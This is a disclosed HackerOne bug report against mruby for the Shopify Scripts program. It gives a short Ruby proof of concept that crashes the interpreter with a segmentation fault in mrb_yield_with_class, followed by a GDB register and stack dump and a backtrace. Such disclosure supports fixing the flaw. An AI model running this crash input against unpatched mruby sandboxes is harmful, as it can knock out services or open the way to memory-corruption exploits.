# SIGSEGV - mrb_yield_with_class

## Report Details
- **Report ID**: 212074
- **URL**: https://hackerone.com/reports/212074
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-09T20:39:57.968Z
- **Disclosed**: 2017-04-13T21:11:01.874Z

## Reporter
- **Username**: icanthack
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Linux Ubuntu Xenial X64
commit 63dbed00946afda34178a479cfa38fa78d620a00
Author: Yukihiro "Matz" Matsumoto <matz@ruby-lang.org>
Date:   Tue Mar 7 15:01:09 2017 +0900


PoC
```
def a
instance_exec (){return}
a()ensure
end
a
```

output
```
 [----------------------------------registers-----------------------------------]
RAX: 0x7ffff7fec7d0
RBX: 0x7ffff7fec7e0
RCX: 0x7ffff7fca800 --> 0x0
RDX: 0x7ffff7fec7e0
RSI: 0x7ffff7fec7d0
RDI: 0x7ffff7fca800 --> 0x0
RBP: 0x7fffffffd780 --> 0x7fffffffd800 --> 0x7fffffffd880 --> 0x7fffffffdf00 --> 0x7fffffffdf50 --> 0x7fffffffdfb0 (--> ...)
RSP: 0x7fffffffd780 --> 0x7fffffffd800 --> 0x7fffffffd880 --> 0x7fffffffdf00 --> 0x7fffffffdf50 --> 0x7fffffffdfb0 (--> ...)
RIP: 0x41ecc8 (<stack_copy+42>:	mov    rdx,QWORD PTR [rax+0x8])
R8 : 0x7ffff7fec7d0
R9 : 0x6b8750 --> 0xc ('\x0c')
R10: 0x1
R11: 0x246
R12: 0x401990 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe310 --> 0x2
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x41ecbc <stack_copy+30>:	mov    rax,QWORD PTR [rbp-0x10]
   0x41ecc0 <stack_copy+34>:	lea    rdx,[rax+0x10]
   0x41ecc4 <stack_copy+38>:	mov    QWORD PTR [rbp-0x10],rdx
=> 0x41ecc8 <stack_copy+42>:	mov    rdx,QWORD PTR [rax+0x8]
   0x41eccc <stack_copy+46>:	mov    rax,QWORD PTR [rax]
   0x41eccf <stack_copy+49>:	mov    QWORD PTR [rcx],rax
   0x41ecd2 <stack_copy+52>:	mov    QWORD PTR [rcx+0x8],rdx
   0x41ecd6 <stack_copy+56>:	mov    rax,QWORD PTR [rbp-0x18]
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd780 --> 0x7fffffffd800 --> 0x7fffffffd880 --> 0x7fffffffdf00 --> 0x7fffffffdf50 --> 0x7fffffffdfb0 (--> ...)
0008| 0x7fffffffd788 --> 0x420b4c (<mrb_yield_with_class+443>:	mov    rax,QWORD PTR [rbp-0x48])
0016| 0x7fffffffd790 --> 0x6b8750 --> 0xc ('\x0c')
0024| 0x7fffffffd798 --> 0x7ffff7fec7d0
0032| 0x7fffffffd7a0 --> 0x747d10 --> 0x20d
0040| 0x7fffffffd7a8 --> 0xd ('\r')
0048| 0x7fffffffd7b0 --> 0x1ffffd810
0056| 0x7fffffffd7b8 --> 0x6b1010 --> 0x7fffffffde10 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000041ecc8 in stack_copy (dst=0x7ffff7fca810, src=0x7ffff7fec7e0, size=0x0) at /home/vagrant/mruby/src/vm.c:87
87	    *dst++ = *src++;
```

bt
```
#0  0x000000000041ecc8 in stack_copy (dst=0x7ffff7fca810, src=0x7ffff7fec7e0, size=0x0) at /home/vagrant/mruby/src/vm.c:87
#1  0x0000000000420b4c in mrb_yield_with_class (mrb=0x6b1010, b=..., argc=0x1, argv=0x7ffff7fec7d0, self=..., c=0x6b8750) at /home/vagrant/mruby/src/vm.c:693
#2  0x000000000046aaf8 in mrb_obj_instance_exec (mrb=0x6b1010, self=...) at /home/vagrant/mruby/mrbgems/mruby-object-ext/src/object.c:87
#3  0x0000000000422bb4 in mrb_vm_exec (mrb=0x6b1010, proc=0x6b3ef0, pc=0x7208b0) at /home/vagrant/mruby/src/vm.c:1229
#4  0x0000000000421088 in mrb_vm_run (mrb=0x6b1010, proc=0x6b3f20, self=..., stack_keep=0x0) at /home/vagrant/mruby/src/vm.c:822
#5  0x0000000000429367 in mrb_top_run (mrb=0x6b1010, proc=0x6b3f20, self=..., stack_keep=0x0) at /home/vagrant/mruby/src/vm.c:2581
#6  0x00000000004497dd in mrb_load_exec (mrb=0x6b1010, p=0x70d970, c=0x70c5d0) at /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5759
#7  0x0000000000449873 in mrb_load_file_cxt (mrb=0x6b1010, f=0x70d5c0, c=0x70c5d0) at /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5768
#8  0x00000000004022f0 in main (argc=0x2, argv=0x7fffffffe318) at /home/vagrant/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227
#9  0x00007ffff7725830 in __libc_start_main (main=0x401fd6 <main>, argc=0x2, argv=0x7fffffffe318, init=<optimized out>, fini=<optimized out>,
    rtld_fini=<optimized out>, stack_end=0x7fffffffe308) at ../csu/libc-start.c:291
#10 0x00000000004019b9 in _start ()
```

## Attachments
No attachments
